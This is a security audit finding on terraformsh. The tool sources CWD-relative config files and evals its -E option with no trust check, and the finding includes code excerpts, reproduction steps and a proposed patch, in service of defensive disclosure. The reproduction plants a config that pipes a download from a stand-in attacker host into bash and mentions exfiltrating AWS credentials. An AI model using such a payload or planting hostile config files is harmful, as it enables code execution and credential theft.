# Finding 16: terraformsh sources ./.terraformshrc and ./terraformsh.conf from the CWD with no trust check

| Field | Value |
|-------|-------|
| Severity | Security |
| Category | Security |
| Affected function(s) | `_load_conf`, `-E` option handler, `_default_vars` (`DEFAULT_CONF_FILES`) |
| Empirically verified | Yes — mechanism reproduced on bash 5.2.21 |
| Status | Open — not yet fixed |
| Reference commit | d0a01c3 |

> Note: line numbers in this document refer to commit d0a01c3. Fixes will
> land as separate PRs, so line numbers WILL drift. Always locate the code by
> **function name** and the quoted snippets below, not by line number.

## Summary

On startup, `terraformsh` unconditionally sources a set of "default" config
files, and that set includes **current-working-directory-relative** files
(`./.terraformshrc`, `./terraformsh.conf`, and/or `./tofush.conf`). These config
files are plain bash that is executed with `.` (source). There is no ownership
check, no trust/allow mechanism (à la `direnv allow`), and no opt-in flag — so
simply `cd`-ing into an untrusted directory (e.g. a freshly cloned repo) and
running *any* terraformsh command runs whatever shell code the directory author
put in `./terraformsh.conf`, with the invoking user's privileges, before
terraform is ever invoked. This is documented behavior (the README shows
`echo 'CD_DIR=...' > terraformsh.conf`), which makes it a deliberate-but-risky
design rather than a coding mistake — but it is a genuine local-code-execution
foot-gun. The separate `-E EXPR` option (`eval "$OPTARG"`) is a related but
lesser concern: it only runs code the user puts on their own command line, so it
is dangerous only when an attacker controls the argv (a Makefile, CI wrapper,
alias, etc.).

## Affected code

```bash
# _default_vars() — approx lines 587-600 (builds DEFAULT_CONF_FILES, including ./-relative paths)
    DEFAULT_CONF_FILES=("/etc/terraformsh" ~/.terraformshrc "./.terraformshrc")
    if [ "$TERRAFORM_TOOLS_EXIST" = "both" ] ; then
        if [ "$TERRAFORM_SHORT_NAME" = "tofu" ] ; then
            DEFAULT_CONF_FILES+=("./tofush.conf")
        else
            DEFAULT_CONF_FILES+=("./terraformsh.conf")
        fi
    elif [ "$TERRAFORM_TOOLS_EXIST" = "terraform" ] ; then
        DEFAULT_CONF_FILES+=("./tofush.conf" "./terraformsh.conf")
    elif [ "$TERRAFORM_TOOLS_EXIST" = "tofu" ] ; then
        DEFAULT_CONF_FILES+=("./terraformsh.conf" "./tofush.conf")
    else
        DEFAULT_CONF_FILES+=("./terraformsh.conf")
    fi
```

```bash
# _load_conf() — approx lines 638-666 (sources each conf file with no trust check)
_load_conf () {
    local _usedefaultconf=1
    declare -a _tmp_confs=()
    if [ ${#CONF_FILE[@]} -lt 1 ] ; then
        _tmp_confs=("${DEFAULT_CONF_FILES[@]}")
    elif [ ${#CONF_FILE[@]} -gt 0 ] ; then
        _usedefaultconf=0
        _tmp_confs=("${CONF_FILE[@]}")
    fi
    for conf in "${_tmp_confs[@]}" ; do
        if [ -d "$conf" ] ; then
            _errexit "Config file '$conf' is a directory! Exiting"
        elif [ "$_usedefaultconf" -eq 0 ] && [ ! -e "$conf" ] ; then
            # If conf file was explicitly specified, it must exist and be readable
            _errexit "Error: could not find conf file '$conf'! Exiting"
        elif [ "$_usedefaultconf" -eq 1 ] && [ ! -e "$conf" ] ; then
            # If using default conf files, just skip nonexistent ones
            continue
        fi
        # If conf file exists, it must be readable
        if [ ! -r "$conf" ] ; then
            _errexit "Error: could not read conf file '$conf'! Exiting"
        fi
        # NOTE: This is not a replacement for 'readlink -f'; if you want
        # that behavior, pass the real file path yourself, don't rely on this.
        . "$(_readlinkf "$conf")"
    done
    return 0
}
```

```bash
# -E option handler in the getopts loop — approx lines 842-848 (eval of arbitrary input)
while getopts "f:b:C:c:E:IPDNnhqv" args ; do
    case $args in
        f)  VARFILES+=("$(_readlinkf "$OPTARG")") ;;
        b)  BACKENDVARFILES+=("$(_readlinkf "$OPTARG")") ;;
        C)  CD_DIR="$OPTARG" ;;
        c)  CONF_FILE+=("$OPTARG") ;;
        E)  eval "$OPTARG" ;;
```

```bash
# main flow — approx lines 870-871 (_load_conf runs unconditionally at startup,
# before any command is processed or dispatched)
_load_parent_tffiles
_load_conf
```

## Why this is a bug

The core security property that is violated: **executing code from a directory
must not happen merely because you are standing in that directory.** terraformsh
breaks that property by default.

* In `_default_vars`, `DEFAULT_CONF_FILES` is seeded with `./`-relative
  entries. Because `pwd`-relative `./terraformsh.conf` is resolved at
  source-time, these point at files in whatever directory terraformsh was
  launched from. (`_load_conf` runs *before* `_dirchange`/`-C` takes effect —
  `_dirchange` is only reached inside `_final_vars`, which is called from the
  `_cmd_*` functions at the very end of the script, long after `_load_conf` at
  line 871 — so the relevant directory is the launch directory, not the `-C`
  target.)

* In `_load_conf`, the only gates applied before sourcing are: "is it a
  directory?", "does it exist?" (skipped silently for defaults) and "is it
  readable?". None of these is a *trust* check. There is no test of file
  ownership, no comparison against an allowlist, and no prompt. The file is then
  run via `. "$(_readlinkf "$conf")"`, i.e. sourced into the current shell, so
  any statement in it executes with full user privileges.

* `_load_conf` is unconditional during startup (line 871). It is not gated on
  the command being `plan`/`apply`; even read-only invocations such as
  `terraformsh output` trigger it. The one exception is `-h`/help:
  `[ $SHOW_HELP -eq 1 ] && _usage` at line 863 runs *before* `_load_conf` (line
  871) and `_usage` exits, so `terraformsh -h` alone does not source configs.
  Every real command, however, reaches `_load_conf` and triggers the sourcing.

* The `-E` handler does `eval "$OPTARG"`. Under `set -e -u -o pipefail` this is
  the user's own argument, so it is only attacker-controlled when the attacker
  controls the command line. It is therefore a documentation/hardening item, not
  an unauthenticated-CWD vector like the config sourcing.

* Comparison point: `direnv` solves exactly this problem by refusing to load a
  `.envrc` until the user runs `direnv allow`, keyed on a hash of the file. git
  itself moved to refusing to run hooks/`core.fsmonitor`/etc. from repos owned by
  another user (`safe.directory`) for the same reason. terraformsh has none of
  these guards.

This is "working as documented" (README §config files explicitly says the format
"is just a bash script" and demonstrates writing `terraformsh.conf` in the CWD),
so it is not a logic error. It is classified Security because the documented
default behavior is itself the vulnerability: implicit, un-opt-in-able code
execution from an untrusted CWD.

## How to reproduce / trigger

Concrete terraformsh trigger — drop a malicious config in any directory and run
any command from it:

```bash
mkdir /tmp/evil-repo && cd /tmp/evil-repo
cat > terraformsh.conf <<'EOF'
curl -s https://attacker.example/x | bash    # or exfiltrate ~/.aws/credentials, etc.
EOF
terraformsh plan        # sources ./terraformsh.conf and runs the payload before terraform
```

EXPECTED: terraformsh should not run arbitrary code from a directory I merely
`cd`-ed into without some explicit opt-in (a prompt, an `allow` step, an
ownership check, or a flag).
ACTUAL: the contents of `./terraformsh.conf` are sourced and executed at startup.

Minimal standalone bash reproduction of the sourcing mechanism (the exact gates
and `. ` from `_load_conf`), **which I ran on bash 5.2.21**:

```bash
cd /tmp && rm -rf tfsh_repro && mkdir tfsh_repro && cd tfsh_repro
cat > terraformsh.conf <<'EOF'
echo "ATTACKER CODE EXECUTED in $(pwd) as user $(id -un)" 1>&2
touch /tmp/tfsh_repro/PWNED
EOF
bash -c '
set -e -u -o pipefail
DEFAULT_CONF_FILES=("/etc/terraformsh" ~/.terraformshrc "./.terraformshrc" "./terraformsh.conf")
for conf in "${DEFAULT_CONF_FILES[@]}" ; do
    [ -e "$conf" ] || continue
    [ -r "$conf" ] || { echo "unreadable"; exit 1; }
    . "$conf"
done
echo "terraformsh continued normally after sourcing"
'
ls -la /tmp/tfsh_repro/PWNED
```

Observed output (ran it):

```
ATTACKER CODE EXECUTED in /tmp/tfsh_repro as user thomas
terraformsh continued normally after sourcing
-rw-rw-r-- 1 thomas thomas 0 Jun 14 17:26 /tmp/tfsh_repro/PWNED
```

The `-E` mechanism (lesser concern), also run:

```bash
bash -c 'while getopts "E:" a; do case $a in E) eval "$OPTARG";; esac; done' \
     -- -E 'echo "E executed as $(id -un)"; touch /tmp/tfsh_repro/PWNED_E'
# -> "E executed as thomas" and /tmp/tfsh_repro/PWNED_E created
```

## Suggested fix

Two independent changes. The first is the important one.

**(1) Gate the CWD-relative default config files behind an opt-in / ownership
check.** Keep absolute and `$HOME` paths (`/etc/terraformsh`, `~/.terraformshrc`)
loading as before — those are trusted locations the user controls. Only the
`./`-relative entries are the problem. Do **not** touch the `-c FILE` path:
`-c` already sets `_usedefaultconf=0` so it bypasses these defaults entirely, and
an explicitly-passed `-c` file is a deliberate user choice that must keep working.

Minimal, low-friction version — refuse to source a CWD config that is not owned
by the current user, and require an env opt-in to load CWD configs at all, with a
loud warning when one is loaded:

```diff
 _load_conf () {
     local _usedefaultconf=1
     declare -a _tmp_confs=()
     if [ ${#CONF_FILE[@]} -lt 1 ] ; then
         _tmp_confs=("${DEFAULT_CONF_FILES[@]}")
     elif [ ${#CONF_FILE[@]} -gt 0 ] ; then
         _usedefaultconf=0
         _tmp_confs=("${CONF_FILE[@]}")
     fi
     for conf in "${_tmp_confs[@]}" ; do
         if [ -d "$conf" ] ; then
             _errexit "Config file '$conf' is a directory! Exiting"
         elif [ "$_usedefaultconf" -eq 0 ] && [ ! -e "$conf" ] ; then
             # If conf file was explicitly specified, it must exist and be readable
             _errexit "Error: could not find conf file '$conf'! Exiting"
         elif [ "$_usedefaultconf" -eq 1 ] && [ ! -e "$conf" ] ; then
             # If using default conf files, just skip nonexistent ones
             continue
         fi
         # If conf file exists, it must be readable
         if [ ! -r "$conf" ] ; then
             _errexit "Error: could not read conf file '$conf'! Exiting"
         fi
+        # Trust check for current-directory-relative default config files.
+        # These come from an untrusted CWD (e.g. a cloned repo), so do not
+        # source them unless the user opted in AND the file is owned by us.
+        case "$conf" in
+            ./*)
+                if [ "${TERRAFORMSH_ALLOW_LOCAL_CONF:-0}" != "1" ] ; then
+                    _stderrlog "Warning: skipping untrusted local config '$conf' (set TERRAFORMSH_ALLOW_LOCAL_CONF=1 or use -c to load it explicitly)"
+                    continue
+                fi
+                if [ ! -O "$conf" ] ; then
+                    _errexit "Refusing to source local config '$conf': not owned by the current user"
+                fi
+                _stderrlog "Warning: sourcing local config '$conf' from the current directory"
+                ;;
+        esac
         # NOTE: This is not a replacement for 'readlink -f'; if you want
         # that behavior, pass the real file path yourself, don't rely on this.
         . "$(_readlinkf "$conf")"
     done
     return 0
 }
```

Notes on the patch:

* `[ -O "$conf" ]` is true only if the file is owned by the effective UID; this
  blocks the cloned-repo-owned-by-another-user case and the root-runs-user-file
  case. Combined with the env opt-in it defaults to *safe* while leaving the
  documented workflow available to anyone who sets one variable (or uses `-c`).
* The `case ./*` match keys off the literal `./` prefix that `_default_vars`
  produces, so `/etc/terraformsh` and `~/.terraformshrc` (which expand to an
  absolute path) are unaffected and keep loading as today.
* If the maintainers prefer zero behavior change by default, swap the env-var
  gate for a one-time `direnv`-style allow file (store a hash under
  `~/.config/terraformsh/allowed`), but that is more code; the env-var + owner
  check above is the minimum that closes the hole.
* Other call sites: `_load_conf` is called exactly once (line 871); no other
  function depends on it sourcing CWD files, so this change is self-contained.

**(2) Document the `-E` risk.** No code change is required for correctness, but
the usage text for `-E` (line 29 / 848) should warn that it `eval`s arbitrary
shell, and the README should warn against passing untrusted `-E` strings (e.g.
from CI variables). Optionally, drop `-E` from the option set entirely if it is
not load-bearing for users.

## Risk / impact

Who hits this: anyone who runs terraformsh after `cd`-ing into a directory they
did not author — cloning a third-party Terraform module/repo, reviewing a
colleague's PR checkout, running in a CI workspace populated from an untrusted
source, or pulling an example repo. That is a very common workflow for a
terraform wrapper.

How often: every invocation of a real command in such a directory triggers it;
no special flags needed. The victim does not have to know config files exist.

How bad: full arbitrary local code execution as the invoking user, before any
terraform runs — so it can steal cloud credentials from the environment or
`~/.aws`, plant persistence, or tamper with the terraform run itself. Because
terraformsh is frequently run by operators with privileged cloud credentials,
the blast radius is the user's entire cloud/identity footprint. Severity:
Security (high). It is not remotely exploitable on its own — it requires the
victim to run terraformsh inside attacker-influenced content — which is why it is
a serious foot-gun rather than a remote RCE.

## Related findings

None directly. This is the only Security-class finding in this batch and should
ship as its own PR (it changes default behavior and warrants its own
release-notes/security advisory). It is conceptually adjacent to
[14](14-readlinkf-global-variable-leak.md) only in that both touch config/path
handling, but they are independent and need not be bundled.
